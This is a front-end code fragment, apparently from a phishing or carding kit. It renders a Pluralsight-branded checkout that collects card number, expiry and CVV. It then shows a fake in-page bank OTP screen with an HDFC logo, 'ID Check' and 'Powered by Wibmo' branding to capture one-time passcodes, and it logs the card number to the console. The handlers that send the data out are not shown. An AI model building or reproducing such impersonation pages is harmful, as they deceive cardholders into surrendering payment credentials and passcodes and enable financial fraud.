                      Email<span className="text-red-500">*</span>
                    </label>
                    <Input
                      type="email"
                      value={formData.email}
                      onChange={(e) => handleInputChange('email', e.target.value)}
                      onBlur={() => handleFieldBlur('email')}
                      className={`bg-white text-slate-900 ${
                        errors.email ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                      }`}
                      placeholder=""
                    />
                    {errors.email && (
                      <p className="text-red-500 text-xs mt-1">{errors.email}</p>
                    )}
                  </div>
                  <div>
                    <label className="block text-sm font-medium mb-2">
                      Confirm Email<span className="text-red-500">*</span>
                    </label>
                    <Input
                      type="email"
                      value={formData.confirmEmail}
                      onChange={(e) => handleInputChange('confirmEmail', e.target.value)}
                      onBlur={() => handleFieldBlur('confirmEmail')}
                      className={`bg-white text-slate-900 ${
                        errors.confirmEmail ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                      }`}
                      placeholder=""
                    />
                    {errors.confirmEmail && (
                      <p className="text-red-500 text-xs mt-1">{errors.confirmEmail}</p>
                    )}
                  </div>
                </div>

                <div className="grid md:grid-cols-2 gap-6 mb-8">
                  <div>
                    <label className="block text-sm font-medium mb-2">
                      Country of residence<span className="text-red-500">*</span>
                    </label>
                    <Select 
                      onValueChange={(value) => {
                        handleInputChange('country', value);
                        handleFieldBlur('country');
                      }}
                    >
                      <SelectTrigger className={`bg-white text-slate-900 ${
                        errors.country ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                      }`}>
                        <SelectValue placeholder="- Select One -" />
                      </SelectTrigger>
                       <SelectContent>
                         <SelectItem value="afghanistan">Afghanistan</SelectItem>
                         <SelectItem value="albania">Albania</SelectItem>
                         <SelectItem value="algeria">Algeria</SelectItem>
                         <SelectItem value="argentina">Argentina</SelectItem>
                         <SelectItem value="armenia">Armenia</SelectItem>
                         <SelectItem value="australia">Australia</SelectItem>
                         <SelectItem value="austria">Austria</SelectItem>
                         <SelectItem value="azerbaijan">Azerbaijan</SelectItem>
                         <SelectItem value="bahrain">Bahrain</SelectItem>
                         <SelectItem value="bangladesh">Bangladesh</SelectItem>
                         <SelectItem value="belarus">Belarus</SelectItem>
                         <SelectItem value="belgium">Belgium</SelectItem>
                         <SelectItem value="brazil">Brazil</SelectItem>
                         <SelectItem value="bulgaria">Bulgaria</SelectItem>
                         <SelectItem value="cambodia">Cambodia</SelectItem>
                         <SelectItem value="canada">Canada</SelectItem>
                         <SelectItem value="chile">Chile</SelectItem>
                         <SelectItem value="china">China</SelectItem>
                         <SelectItem value="colombia">Colombia</SelectItem>
                         <SelectItem value="croatia">Croatia</SelectItem>
                         <SelectItem value="cyprus">Cyprus</SelectItem>
                         <SelectItem value="czech-republic">Czech Republic</SelectItem>
                         <SelectItem value="denmark">Denmark</SelectItem>
                         <SelectItem value="egypt">Egypt</SelectItem>
                         <SelectItem value="estonia">Estonia</SelectItem>
                         <SelectItem value="finland">Finland</SelectItem>
                         <SelectItem value="france">France</SelectItem>
                         <SelectItem value="georgia">Georgia</SelectItem>
                         <SelectItem value="germany">Germany</SelectItem>
                         <SelectItem value="ghana">Ghana</SelectItem>
                         <SelectItem value="greece">Greece</SelectItem>
                         <SelectItem value="hungary">Hungary</SelectItem>
                         <SelectItem value="iceland">Iceland</SelectItem>
                         <SelectItem value="india">India</SelectItem>
                         <SelectItem value="indonesia">Indonesia</SelectItem>
                         <SelectItem value="iran">Iran</SelectItem>
                         <SelectItem value="iraq">Iraq</SelectItem>
                         <SelectItem value="ireland">Ireland</SelectItem>
                         <SelectItem value="israel">Israel</SelectItem>
                         <SelectItem value="italy">Italy</SelectItem>
                         <SelectItem value="japan">Japan</SelectItem>
                         <SelectItem value="jordan">Jordan</SelectItem>
                         <SelectItem value="kazakhstan">Kazakhstan</SelectItem>
                         <SelectItem value="kenya">Kenya</SelectItem>
                         <SelectItem value="kuwait">Kuwait</SelectItem>
                         <SelectItem value="latvia">Latvia</SelectItem>
                         <SelectItem value="lebanon">Lebanon</SelectItem>
                         <SelectItem value="lithuania">Lithuania</SelectItem>
                         <SelectItem value="luxembourg">Luxembourg</SelectItem>
                         <SelectItem value="malaysia">Malaysia</SelectItem>
                         <SelectItem value="mexico">Mexico</SelectItem>
                         <SelectItem value="morocco">Morocco</SelectItem>
                         <SelectItem value="netherlands">Netherlands</SelectItem>
                         <SelectItem value="new-zealand">New Zealand</SelectItem>
                         <SelectItem value="nigeria">Nigeria</SelectItem>
                         <SelectItem value="norway">Norway</SelectItem>
                         <SelectItem value="pakistan">Pakistan</SelectItem>
                         <SelectItem value="peru">Peru</SelectItem>
                         <SelectItem value="philippines">Philippines</SelectItem>
                         <SelectItem value="poland">Poland</SelectItem>
                         <SelectItem value="portugal">Portugal</SelectItem>
                         <SelectItem value="qatar">Qatar</SelectItem>
                         <SelectItem value="romania">Romania</SelectItem>
                         <SelectItem value="russia">Russia</SelectItem>
                         <SelectItem value="saudi-arabia">Saudi Arabia</SelectItem>
                         <SelectItem value="singapore">Singapore</SelectItem>
                         <SelectItem value="slovakia">Slovakia</SelectItem>
                         <SelectItem value="slovenia">Slovenia</SelectItem>
                         <SelectItem value="south-africa">South Africa</SelectItem>
                         <SelectItem value="south-korea">South Korea</SelectItem>
                         <SelectItem value="spain">Spain</SelectItem>
                         <SelectItem value="sri-lanka">Sri Lanka</SelectItem>
                         <SelectItem value="sweden">Sweden</SelectItem>
                         <SelectItem value="switzerland">Switzerland</SelectItem>
                         <SelectItem value="taiwan">Taiwan</SelectItem>
                         <SelectItem value="thailand">Thailand</SelectItem>
                         <SelectItem value="turkey">Turkey</SelectItem>
                         <SelectItem value="ukraine">Ukraine</SelectItem>
                         <SelectItem value="uae">United Arab Emirates</SelectItem>
                         <SelectItem value="uk">United Kingdom</SelectItem>
                         <SelectItem value="usa">United States</SelectItem>
                         <SelectItem value="venezuela">Venezuela</SelectItem>
                         <SelectItem value="vietnam">Vietnam</SelectItem>
                       </SelectContent>
                    </Select>
                    {errors.country && (
                      <p className="text-red-500 text-xs mt-1">{errors.country}</p>
                    )}
                  </div>
                  <div>
                    <label className="block text-sm font-medium mb-2">
                      Company name (optional)
                    </label>
                    <Input
                      value={formData.companyName}
                      onChange={(e) => handleInputChange('companyName', e.target.value)}
                      className="bg-white text-slate-900 border-slate-300"
                      placeholder=""
                    />
                  </div>
                </div>

                {/* Terms and Conditions */}
                <div className="mb-8">
                  <div className="flex items-center gap-2">
                    <Checkbox
                      id="terms-checkbox"
                      checked={agreeTerms}
                      onCheckedChange={(checked) => {
                        console.log('Checkbox clicked, new state:', checked);
                        setAgreeTerms(checked === true);
                        if (checked) {
                          setShowTermsError(false);
                        }
                      }}
                      className={`h-3 w-3 rounded border-2 data-[state=checked]:bg-blue-600 data-[state=checked]:border-blue-600 data-[state=unchecked]:bg-transparent data-[state=unchecked]:border-gray-400 ${showTermsError ? 'border-red-500' : 'border-gray-400'} hover:border-blue-500 transition-colors flex-shrink-0 cursor-pointer flex items-center justify-center`}
                    />
                    <label 
                      htmlFor="terms-checkbox" 
                      className={`text-sm leading-5 cursor-pointer select-none ${showTermsError ? 'text-red-500' : 'text-slate-300'} hover:text-slate-200 transition-colors`}
                    >
                      By checking here and continuing, I agree to the Pluralsight{' '}
                      <a href="#" className="text-blue-400 hover:underline">Terms of Use</a>.
                    </label>
                  </div>
                </div>

                {/* Continue Button */}
                <Button
                  onClick={handleContinue}
                  disabled={!isFormValid()}
                  className={`w-full md:w-auto px-12 py-3 rounded font-medium ${
                    isFormValid() 
                      ? 'bg-blue-600 hover:bg-blue-700 text-white' 
                      : 'bg-slate-500 text-slate-300 cursor-not-allowed'
                  }`}
                >
                  Continue
                </Button>
              </>
            )}

            {/* Loading Section */}
            {currentStep === 'loading' && (
              <div className="flex flex-col items-center justify-center py-20">
                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center text-sm font-medium">
                    ✓
                  </div>
                  <h2 className="text-2xl font-bold">Account details</h2>
                </div>
                
                <div className="flex items-center gap-3 mb-12">
                  <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-sm font-medium">
                    2
                  </div>
                  <h2 className="text-2xl font-bold">Payment</h2>
                </div>

                <p className="text-white mb-6 text-lg">Select a payment method</p>
                
                <div className="flex items-center justify-center">
                  <Loader2 className="h-12 w-12 animate-spin text-blue-500" />
                </div>
              </div>
            )}

            {/* Payment Section */}
            {currentStep === 'payment' && (
              <>
                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center text-sm font-medium">
                    ✓
                  </div>
                  <span className="text-slate-300 font-medium">Account details</span>
                </div>

                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-sm font-medium">
                    2
                  </div>
                  <h2 className="text-2xl font-bold">Payment</h2>
                </div>

                <p className="text-white mb-8 text-lg">Select a payment method</p>

                {/* Transaction Cancel Error Message */}
                {transactionCancelError && (
                  <div className="bg-red-50 border border-red-200 rounded-lg p-3 mb-6">
                    <p className="text-red-700 text-sm font-medium">
                      {transactionCancelError}
                    </p>
                  </div>
                )}

                {/* Payment Method Selection */}
                <div 
                  className={`border border-slate-600 rounded-lg p-4 mb-6 cursor-pointer transition-all ${
                    paymentMethod === 'credit' ? 'border-blue-500 bg-slate-800' : 'hover:border-slate-500'
                  }`}
                  onClick={() => handlePaymentMethodSelect('credit')}
                >
                  <div className="flex items-center gap-3">
                    <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                      paymentMethod === 'credit' ? 'border-blue-500' : 'border-slate-400'
                    }`}>
                      {paymentMethod === 'credit' && (
                        <div className="w-2.5 h-2.5 bg-blue-500 rounded-full"></div>
                      )}
                    </div>
                    <CreditCard className="h-5 w-5 text-blue-400" />
                    <span className="font-medium">Credit Card / Debit Card</span>
                    <div className="ml-auto flex gap-2">
                      {/* Updated card brand logos with exact same size and positioning */}
                      <div className="h-8 w-12 bg-white rounded flex items-center justify-center p-1">
                        <img 
                          src="https://brandlogos.net/wp-content/uploads/2014/10/visa-logo-300x300.png" 
                          alt="Visa" 
                          className="h-6 w-10 object-contain"
                        />
                      </div>
                      <div className="h-8 w-12 bg-white rounded flex items-center justify-center p-1">
                        <img 
                          src="https://i.pinimg.com/originals/48/40/de/4840deeea4afad677728525d165405d0.jpg" 
                          alt="Mastercard" 
                          className="h-6 w-10 object-contain"
                        />
                      </div>
                      <div className="h-8 w-12 bg-white rounded flex items-center justify-center p-1">
                        <img 
                          src="https://images.seeklogo.com/logo-png/49/2/discover-card-logo-png_seeklogo-499264.png" 
                          alt="Discover" 
                          className="h-6 w-10 object-contain"
                        />
                      </div>
                      <div className="h-8 w-12 bg-white rounded flex items-center justify-center p-1">
                        <img 
                          src="https://brandlogos.net/wp-content/uploads/2022/03/rupay-logo-brandlogos.net_-512x512.png" 
                          alt="RuPay" 
                          className="h-6 w-10 object-contain"
                        />
                      </div>
                    </div>
                  </div>
                </div>

                {/* Card Details Form - Only shown when credit card is selected */}
                {paymentMethod === 'credit' && (
                  <div className="space-y-6 mb-8">
                    {/* Card Declined Error Message */}
                    {cardDeclinedError && (
                      <div className="bg-red-50 border border-red-300 rounded-lg p-4">
                        <p className="text-red-700 text-sm font-medium">{cardDeclinedError}</p>
                      </div>
                    )}
                    {cardError && (
                      <div className="mb-4">
                        <div className="bg-red-50 border border-red-500 text-red-700 rounded p-2 text-center text-sm font-semibold">
                          {cardError}
                        </div>
                      </div>
                    )}
                    <div className="grid md:grid-cols-2 gap-6">
                      <div>
                        <label className="block text-sm font-medium mb-2">
                          Name on card<span className="text-red-500">*</span>
                        </label>
                        <Input
                          value={cardData.cardName}
                          onChange={(e) => handleCardInputChange('cardName', e.target.value)}
                          className={`bg-white text-slate-900 ${
                            cardErrors.cardName ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                          }`}
                          placeholder=""
                        />
                        {cardErrors.cardName && (
                          <p className="text-red-500 text-xs mt-1">{cardErrors.cardName}</p>
                        )}
                      </div>
                       <div>
                         <label className="block text-sm font-medium mb-2">
                           Card number<span className="text-red-500">*</span>
                         </label>
                         <div className="relative">
                           <Input
                             value={cardData.cardNumber}
                             onChange={(e) => {
                               const value = e.target.value.slice(0, 19); // Allow for spaces (16 digits + 3 spaces)
                               handleCardInputChange('cardNumber', value);
                             }}
                             className={`bg-white text-slate-900 pr-12 ${
                               cardErrors.cardNumber ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                             }`}
                             placeholder="1234 5678 9012 3456"
                           />
                           {/* Card Brand Logo */}
                           {cardData.cardNumber.length >= 4 && getCardType(cardData.cardNumber) && (
                             <div className="absolute right-3 top-1/2 transform -translate-y-1/2 transition-all duration-300 hover:scale-110">
                               {getCardType(cardData.cardNumber) === 'visa' && (
                                 <img 
                                   src="https://cdn4.iconfinder.com/data/icons/simple-peyment-methods/512/visa-128.png" 
                                   alt="Visa" 
                                   className="h-6 w-8 object-contain"
                                 />
                               )}
                               {getCardType(cardData.cardNumber) === 'mastercard' && (
                                 <img 
                                   src="https://brandlogos.net/wp-content/uploads/2011/08/mastercard-logo.png" 
                                   alt="Mastercard" 
                                   className="h-6 w-8 object-contain"
                                 />
                               )}
                               {getCardType(cardData.cardNumber) === 'discover' && (
                                 <img 
                                   src="https://1000logos.net/wp-content/uploads/2021/05/Discover-logo-500x281.png" 
                                   alt="Discover" 
                                   className="h-6 w-8 object-contain"
                                 />
                               )}
                               {getCardType(cardData.cardNumber) === 'rupay' && (
                                 <img 
                                   src="https://logotyp.us/file/rupay.svg" 
                                   alt="RuPay" 
                                   className="h-6 w-8 object-contain"
                                 />
                               )}
                             </div>
                           )}
                         </div>
                         {cardErrors.cardNumber && (
                           <div className="mt-1 px-3 py-2 bg-red-50 border border-red-200 rounded text-red-600 text-xs">
                             {cardErrors.cardNumber}
                           </div>
                         )}
                       </div>
                    </div>

                    <div className="grid grid-cols-3 gap-6">
                      <div>
                        <label className="block text-sm font-medium mb-2">
                          Expiration<span className="text-red-500">*</span>
                        </label>
                         <Select onValueChange={(value) => handleCardInputChange('expiryMonth', value)}>
                           <SelectTrigger className={`bg-white text-slate-900 ${
                             cardErrors.expiryMonth ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                           }`}>
                             <SelectValue placeholder="Month" />
                           </SelectTrigger>
                           <SelectContent>
                             {Array.from({length: 12}, (_, i) => (
                               <SelectItem key={i+1} value={String(i+1).padStart(2, '0')}>
                                 {String(i+1).padStart(2, '0')}
                               </SelectItem>
                             ))}
                           </SelectContent>
                         </Select>
                         {cardErrors.expiryMonth && (
                           <div className="mt-1 px-3 py-2 bg-red-50 border border-red-200 rounded text-red-600 text-xs">
                             {cardErrors.expiryMonth}
                           </div>
                         )}
                      </div>
                      <div>
                        <label className="block text-sm font-medium mb-2 text-transparent">Year</label>
                         <Select onValueChange={(value) => handleCardInputChange('expiryYear', value)}>
                           <SelectTrigger className={`bg-white text-slate-900 ${
                             cardErrors.expiryYear ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                           }`}>
                             <SelectValue placeholder="Year" />
                           </SelectTrigger>
                           <SelectContent>
                             {Array.from({length: 51}, (_, i) => {
                               const year = new Date().getFullYear() + i;
                               return (
                                 <SelectItem key={year} value={String(year).slice(-2)}>
                                   {year}
                                 </SelectItem>
                               );
                             })}
                           </SelectContent>
                         </Select>
                         {cardErrors.expiryYear && (
                           <div className="mt-1 px-3 py-2 bg-red-50 border border-red-200 rounded text-red-600 text-xs">
                             {cardErrors.expiryYear}
                           </div>
                         )}
                      </div>
                      <div>
                        <label className="block text-sm font-medium mb-2">
                          CVV<span className="text-red-500">*</span>
                        </label>
                        <Input
                          value={cardData.cvv}
                          onChange={(e) => {
                            const value = e.target.value.replace(/\D/g, '').slice(0, 4);
                            handleCardInputChange('cvv', value);
                          }}
                          className={`bg-white text-slate-900 ${
                            cardErrors.cvv ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                          }`}
                          placeholder="123"
                        />
                        {cardErrors.cvv && (
                          <p className="text-red-500 text-xs mt-1">{cardErrors.cvv}</p>
                        )}
                      </div>
                    </div>

                    {/* Review Order Button */}
                    <Button
                      onClick={handleReviewOrder}
                      disabled={!paymentMethod || !areAllCardFieldsFilled() || !isCardFormValid()}
                      className={`w-full md:w-auto px-12 py-3 rounded font-medium ${
                        paymentMethod && areAllCardFieldsFilled() && isCardFormValid()
                          ? 'bg-blue-600 hover:bg-blue-700 text-white' 
                          : 'bg-slate-500 text-slate-300 cursor-not-allowed'
                      }`}
                    >
                      Review order
                    </Button>
                    

                  </div>
                )}
              </>
            )}

            {/* Processing Section */}
            {currentStep === 'processing' && (
              <div className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm flex items-center justify-center z-50">
                <div className="text-center">
                  <Loader2 className="h-16 w-16 animate-spin text-blue-500 mb-6 mx-auto" />
                  <p className="text-white text-lg font-medium">{processingMessage}</p>
                </div>
              </div>
            )}

            {/* Enhanced OTP Verification Section */}
            {currentStep === 'otp' && (
              <div className="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 p-2">
                {/* Cancel Button (outside white box, top right) */}
                <button
                  onClick={() => setShowCancelConfirm(true)}
                  className="absolute top-8 right-8 text-white hover:text-gray-300 text-sm font-medium underline bg-transparent border-none cursor-pointer z-[60]"
                  aria-label="Cancel Transaction"
                >
                  Cancel
                </button>
                <div className="bg-white rounded-lg w-full max-w-md shadow-2xl relative" style={{ minWidth: 420, maxWidth: 440 }}>
                  {/* OTP Loading Overlay */}
                  {otpLoading && (
                    <div className="absolute inset-0 bg-white rounded-lg flex items-center justify-center z-50">
                      <div className="text-center">
                        {/* Card Brand Logo */}
                        <div className="mb-8">
                          <img 
                            src={(() => {
                              const cardBrand = getCardBrand(cardData.cardNumber);
                              console.log('Card Number:', cardData.cardNumber);
                              console.log('Detected Card Brand:', cardBrand);
                              console.log('Logo URL:', cardBrandLogos[cardBrand as keyof typeof cardBrandLogos]);
                              return cardBrandLogos[cardBrand as keyof typeof cardBrandLogos];
                            })()} 
                            alt="Card Brand" 
                            className="w-20 h-20 mx-auto object-contain"
                            onError={(e) => {
                              console.log('Logo loading failed, falling back to Visa');
                              e.currentTarget.src = cardBrandLogos.visa;
                            }}
                          />
                        </div>
                        {/* Loading Spinner */}
                        <div className="w-10 h-10 border-4 border-gray-300 border-t-transparent rounded-full animate-spin mx-auto"></div>
                      </div>
                    </div>
                  )}
                  
                  {/* Cancel Confirmation Popup */}
                  {showCancelConfirm && (
                    <div className="absolute inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[70]">
                      <div className="bg-white rounded-lg p-6 max-w-sm mx-4 shadow-2xl">
                        <h3 className="text-lg font-semibold text-gray-800 mb-4 text-center">
                          Do you want to cancel this transaction?
                        </h3>
                        <div className="flex gap-3 justify-center">
                          <button
                            onClick={() => {
                              // Yes - redirect to card details with error
                              setShowCancelConfirm(false);
                              setCurrentStep('payment');
                              setShowOtp(false);
                              setTransactionCancelError('User cancelled the transaction');
                              setOtpValue('');
                              setOtpError('');
                            }}
                            className="px-6 py-2 bg-red-600 text-white rounded hover:bg-red-700 font-medium"
                          >
                            Yes
                          </button>
                          <button
                            onClick={() => setShowCancelConfirm(false)}
                            className="px-6 py-2 bg-gray-300 text-gray-700 rounded hover:bg-gray-400 font-medium"
                          >
                            No
                          </button>
                        </div>
                      </div>
                    </div>
                  )}


                  {/* Top Row: Card Brand Logo (left) and Bank Logo (right) */}
                  <div className="flex items-center justify-between px-8 pt-8 pb-2 border-b border-gray-200">
                    <div className="flex items-center gap-2">
                      <img
                        src={cardBrandLogos[getCardBrand(cardData.cardNumber) as keyof typeof cardBrandLogos]}
                        alt="Card Brand Logo"
                        className="h-10 w-24 object-contain"
                        onError={(e) => {
                          console.log('Header logo loading failed, falling back to Visa');
                          e.currentTarget.src = cardBrandLogos.visa;
                        }}
                      />
                      <span className="font-semibold text-gray-700 text-base">ID Check</span>
                    </div>
                    <img
                      src={sessionBankLogo || 'https://images.seeklogo.com/logo-png/55/2/hdfc-bank-logo-png_seeklogo-556499.png'}
                      alt="Bank Logo"
                      className="h-10 w-24 object-contain"
                    />
                  </div>
                  {/* Merchant Details Table */}
                  <div className="px-8 pt-4 pb-2">
                    <table className="w-full text-sm">
                      <tbody>
                        <tr>
                          <td className="text-gray-600 py-1">Merchant Name</td>
                          <td className="text-right font-medium text-gray-800 py-1">PLURALSIGHT</td>
                        </tr>
                        <tr>
                          <td className="text-gray-600 py-1">Date</td>
                          <td className="text-right font-medium text-gray-800 py-1">{new Date().toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' })}</td>
                        </tr>
                        <tr>
                          <td className="text-gray-600 py-1">Card Number</td>
                          <td className="text-right font-medium text-gray-800 py-1">{cardData.cardNumber.slice(0, 4)} XXXX XXXX {cardData.cardNumber.slice(-4)}</td>
                        </tr>
                        <tr>
                          <td className="text-gray-600 py-1">Amount</td>
                          <td className="text-right font-bold text-blue-700 py-1">₹{displayPrice.toLocaleString()}</td>
                        </tr>
                        <tr>
                          <td className="text-gray-600 py-1">Personal Message</td>
                          <td className="text-right font-medium text-gray-800 py-1"></td>
                        </tr>
                      </tbody>
                    </table>
                  </div>
                  {/* Authenticate Transaction Title */}
                  <div className="px-8 pt-2 pb-0">
                    <h3 className="text-base font-semibold text-blue-700 text-center mb-2">Authenticate Transaction</h3>
                  </div>
                  {/* OTP Sent Message or Resend Message */}
                  <div className="px-8">
                    {resendMessage ? (
                      <div className="bg-green-50 border border-green-200 rounded p-2 mb-2">
                        <p className="text-green-700 text-sm text-center">
                          One time passcode has been sent to your registered mobile number XX{otpMobileLast4}
                        </p>
                      </div>
                    ) : (
                      <div className="bg-green-50 border border-green-200 rounded p-2 mb-2">
                        <p className="text-green-700 text-sm text-center">
                          One time passcode has been sent to your registered mobile number XX{otpMobileLast4}
                        </p>
                      </div>
                    )}
                  </div>
                  {/* Addon Cardholder OTP Button */}
                  <div className="px-8 mb-2">
                    <button className="w-full bg-blue-50 text-blue-700 text-xs font-semibold py-1 rounded mb-2 border border-blue-100 hover:bg-blue-100 transition">
                      CLICK HERE For Addon Cardholder OTP
                    </button>
                  </div>
                  {/* Error Message (Fail OTP) */}
                  {otpError && (
                    <div className="px-8 mb-2">
                      <div className="border border-red-500 rounded p-2">
                        <p className="text-red-700 text-xs text-center">{otpError}</p>
                      </div>
                    </div>
                  )}
                  {/* OTP Input */}
                  <div className="px-8 mb-2">
                    <input
                      value={otpValue}
                      onChange={e => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
                      disabled={otpSubmitting}
                      className="w-full text-center text-base tracking-widest h-10 border-2 border-blue-400 rounded bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-blue-400"
                      placeholder="Enter OTP Here"
                      maxLength={6}
                      style={{ letterSpacing: '0.3em', fontSize: '1rem' }}
                    />
                  </div>
                  {/* Resend OTP Link */}
                  <div className="px-8 mb-2 text-right">
                    <button
                      onClick={() => {
                        setResendMessage('One time passcode has been sent to your registered mobile number XX' + otpMobileLast4);
                        startOtpTimer();
                      }}
                      className="text-blue-700 text-xs font-semibold hover:underline focus:outline-none"
                      disabled={otpSubmitting}
                    >
                      Resend OTP
                    </button>
                  </div>
                  {/* Action Buttons */}
                  <div className="px-8 pb-2">
                    <button
                      onClick={handleOtpSubmit}
                      disabled={otpValue.length !== 6 || otpSubmitting}
                      className="w-full h-9 rounded bg-blue-700 text-white font-semibold hover:bg-blue-800 transition disabled:opacity-50 relative text-base"
                    >
                      {otpSubmitting ? (
                        <span className="flex items-center justify-center"><Loader2 className="h-4 w-4 animate-spin mr-2" />SUBMIT</span>
                      ) : (
                        'SUBMIT'
                      )}
                    </button>
                  </div>

                  {/* Timer and Powered by Footer */}
                  <div className="text-center space-y-2 pb-4 pt-2">
                    <p className="text-xs text-gray-500">
                      This page automatically time out after {formatTimer(otpTimer)} minutes
                    </p>
                    <div className="flex items-center justify-center gap-2">
                      <span className="text-xs text-gray-500">Powered by</span>
                      <img
                        src="https://www.pngkey.com/png/detail/281-2815007_wibmo-logo.png"
                        alt="Wibmo"
                        className="h-4 object-contain"
                      />
                    </div>
                  </div>
                  {/* Spinner overlay for Declined/Insufficient */}
                  {showSpinner && (
                    <div className="absolute inset-0 bg-white bg-opacity-90 backdrop-blur-sm flex items-center justify-center z-50">
                      <div className="text-center">
                        <div className="w-16 h-16 bg-gradient-to-r from-green-400 to-blue-500 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
                          <CheckCircle className="h-8 w-8 text-white animate-bounce" />
                        </div>
                        <h3 className="text-lg font-semibold text-gray-800 mb-2">Processing Payment...</h3>
                        <p className="text-gray-600 text-sm">Please wait while we confirm your transaction</p>
                      </div>
                    </div>
                  )}
                  {/* Decline/Insufficient error message (after redirect) */}
                  {declineError && (
                    <div className="absolute left-0 right-0 top-2 text-center">
                      <span className="text-red-600 text-sm font-semibold">{declineError}</span>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* Review Section */}
            {currentStep === 'review' && (
              <>
                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center text-sm font-medium">
                    ✓
                  </div>
                  <span className="text-slate-300 font-medium">Account details</span>
                </div>

                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center text-sm font-medium">
                    ✓
                  </div>
                  <span className="text-slate-300 font-medium">Payment</span>
                </div>

                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-sm font-medium">
                    3
                  </div>
                  <h2 className="text-2xl font-bold">Review and confirm</h2>
                </div>

                <div className="bg-slate-800 rounded-lg p-6 mb-8">
                  <h3 className="text-xl font-bold mb-6">Review your order details</h3>
                  
                  <div className="space-y-4">
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Plan</span>
                      <span className="text-slate-300">{planName} - {billingText}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Payment Method</span>
                      <div className="flex items-center gap-3">
                        <img 
                          src={cardBrandLogos[getCardBrand(cardData.cardNumber) as keyof typeof cardBrandLogos]} 
                          alt="Card Brand" 
                          className="h-6 w-10 object-contain"
                          onError={(e) => {
                            e.currentTarget.src = cardBrandLogos.visa;
                          }}
                        />
                        <span className="text-slate-300">ending in {cardData.cardNumber.slice(-4)}</span>
                      </div>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Billing Cycle</span>
                      <span className="text-slate-300">{billing === 'yearly' ? 'Yearly' : 'Monthly'}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Date & Time</span>
                      <span className="text-slate-300">{new Date().toLocaleString()}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Country</span>
                      <span className="text-slate-300">{formData.country}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Customer</span>
                      <span className="text-slate-300">{formData.firstName} {formData.lastName}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Email</span>
                      <span className="text-slate-300">{formData.email}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Transaction ID</span>
                      <span className="text-slate-300 font-mono">{transactionId}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Total Amount</span>
                      <span className="text-xl font-bold text-white">₹{displayPrice.toLocaleString()}</span>
                    </div>
                  </div>
                </div>

                <Button
                  onClick={handleConfirmPayment}
                  disabled={confirmingPayment}
                  className="w-full md:w-auto px-12 py-3 rounded font-medium bg-green-600 hover:bg-green-700 text-white relative"
                >
                  {confirmingPayment && (
                    <>
                      <div className="absolute inset-0 bg-green-600 bg-opacity-50 rounded flex items-center justify-center">
                        <Loader2 className="h-5 w-5 animate-spin" />
                      </div>
                      <span className="opacity-30">Confirm Payment</span>
                    </>
                  )}
                  {!confirmingPayment && 'Confirm Payment'}
                </Button>
              </>
            )}
          </div>

          {/* Order Summary */}
          <div className="lg:col-span-1">
            <div className="bg-slate-800 rounded-lg p-6">
              <h3 className="text-xl font-bold mb-6">Order summary</h3>
              
              <div className="flex justify-between items-center mb-4">
                <span className="font-medium">Plan</span>
                <span className="font-medium">Price</span>
              </div>
              
              <div className="flex justify-between items-center mb-6 pb-4 border-b border-slate-600">
                <span className="text-slate-300">{planName} - {billingText}</span>
                <span className="font-bold">₹{displayPrice.toLocaleString()}</span>
              </div>

              {/* Promo Code */}
              <div className="mb-6">
                <div className="flex gap-2">
                  <Input
                    value={promoCode}
                    onChange={(e) => setPromoCode(e.target.value)}
                    placeholder="Promo Code"
                    className="bg-white text-slate-900 border-slate-300 flex-1"
                  />
                  <Button variant="outline" className="text-slate-900 border-slate-300 bg-blue-600 text-white hover:bg-blue-700">
                    Apply
                  </Button>
                </div>
              </div>

              {/* Summary */}
              <div className="space-y-3 mb-6">
                <div className="flex justify-between">
                  <span className="text-slate-300">Subtotal</span>
                  <span>₹{displayPrice.toLocaleString()}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-300">Estimated tax<sup>†</sup></span>
                  <span>₹0</span>
                </div>
              </div>

              <div className="border-t border-slate-600 pt-4 mb-6">
                <div className="flex justify-between items-center">
                  <span className="text-xl font-bold">Total due today</span>
                  <span className="text-xl font-bold">₹{displayPrice.toLocaleString()}</span>
                </div>
